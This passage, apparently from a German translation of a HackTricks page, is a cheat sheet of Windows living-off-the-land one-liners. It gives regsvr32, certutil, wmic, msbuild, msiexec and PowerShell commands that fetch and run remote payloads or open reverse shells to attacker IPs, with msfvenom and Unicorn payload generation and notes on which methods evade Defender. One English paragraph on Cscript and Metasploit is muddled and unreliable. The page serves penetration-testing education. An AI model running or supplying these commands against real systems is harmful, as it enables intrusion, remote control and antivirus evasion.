#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```
**Sie können ganz einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager regsvr verwenden**

## Certutil

* [Von hier aus](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)

Laden Sie eine B64dll herunter, decodieren Sie sie und führen Sie sie aus.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```
Lade eine B64exe herunter, dekodiere sie und führe sie aus.
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```
**Von Defender erkannt**


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## **Cscript/Wscript**
```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
**Cscript - Metasploit**

Cscript is a command-line scripting engine provided by Microsoft. It is commonly used to execute VBScript or JScript scripts on Windows systems. Metasploit, on the other hand, is a popular penetration testing framework that includes various tools and exploits for testing the security of computer systems.

In the context of Metasploit, Cscript can be used as a payload to deliver malicious scripts to a target system. This can be done by creating a malicious script using Metasploit's scripting capabilities and then using Cscript to execute it on the target.

To use Cscript as a payload in Metasploit, you can follow these steps:

1. Generate a malicious script using Metasploit's scripting capabilities. This can be done using the `msfvenom` command, which allows you to generate various types of payloads.

2. Set the payload to use Cscript. This can be done by specifying the `PAYLOAD` option in Metasploit and setting it to `windows/meterpreter/reverse_tcp_rc4`.

3. Configure the necessary options for the payload, such as the `LHOST` (your IP address) and `LPORT` (the port on which the payload will connect back to).

4. Exploit the target system by running the exploit module. This will deliver the malicious script to the target and execute it using Cscript.

By using Cscript as a payload in Metasploit, you can leverage its scripting capabilities to execute malicious scripts on target systems, allowing you to gain unauthorized access or perform other malicious activities. It is important to note that the use of such techniques should only be done in a legal and ethical manner, such as during authorized penetration testing engagements.
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```
**Von Defender erkannt**

## PS-Bat
```bash
\\webdavserver\folder\batchfile.bat
```
Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
Payload auf der Festplatte geschrieben: **WebDAV-Client-Lokalcache**
```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```
**Von Defender erkannt**

## **MSIExec**

Angreifer
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```
Opfer:
```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```
**Erkannt**

## **Wmic**

* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
wmic os get /format:"https://webserver/payload.xsl"
```
Beispiel xsl-Datei [von hier](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
]]>
</ms:script>
</stylesheet>
```
**Nicht erkannt**

**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager wmic verwenden**

## Msbuild

* [Von hier aus](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```
Sie können diese Technik verwenden, um die Anwendungs-Whitelisting- und Powershell.exe-Beschränkungen zu umgehen. Sie werden mit einer PS-Shell aufgefordert.\
Laden Sie dies einfach herunter und führen Sie es aus: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj)
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```
**Nicht erkannt**

## **CSC**

Kompilieren Sie C#-Code auf dem Opferrechner.
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```
Sie können eine grundlegende C#-Umkehrschale von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**Nicht erkannt**

## **Regasm/Regsvc**

* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```
**Ich habe es nicht ausprobiert**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182)

## Odbcconf

* [Von hier](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```
**Ich habe es nicht ausprobiert**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2)

## Powershell-Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

Im Ordner **Shells** gibt es viele verschiedene Shells. Um **Invoke-_PowerShellTcp.ps1_** herunterzuladen und auszuführen, machen Sie eine Kopie des Skripts und fügen Sie am Ende der Datei Folgendes hinzu:
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```
Starten Sie den Skript-Server und führen Sie ihn auf dem Endgerät des Opfers aus:
```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```
Defender erkennt es nicht als bösartigen Code (noch nicht, 3/04/2019).

**TODO: Überprüfen Sie andere Nishang-Shells**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

Herunterladen, einen Webserver starten, den Listener starten und es auf dem Endgerät des Opfers ausführen:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
Defender erkennt es nicht als bösartigen Code (noch nicht, 3/04/2019).

**Andere von powercat angebotene Optionen:**

Bind-Shells, Reverse-Shell (TCP, UDP, DNS), Port-Weiterleitung, Upload/Download, Payloads generieren, Dateien bereitstellen...
```
Serve a cmd Shell:
powercat -l -p 443 -e cmd
Send a cmd Shell:
powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
powercat -l -p 443 -i C:\inputfile -rep
```
### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

Erstellen Sie einen PowerShell-Launcher, speichern Sie ihn in einer Datei und laden Sie ihn herunter und führen Sie ihn aus.
```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```
**Als bösartiger Code erkannt**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Erstellen Sie eine PowerShell-Version eines Metasploit-Backdoors mit Unicorn.
```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```
Starten Sie msfconsole mit der erstellten Ressource:
```
msfconsole -r unicorn.rc
```
Starten Sie einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führen Sie sie beim Opfer aus:
```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```
**Als bösartiger Code erkannt**

## Mehr

[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen offensiven PS-Modulen vorab geladen (verschlüsselt)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensiven PS-Modulen und Proxy-Erkennung (IEX)

## Referenzen

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [https://gist.github.com/Arno0x](https://gist.github.com/Arno0x)
* [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
* [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
* [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
​

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Sicherheitslücken, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
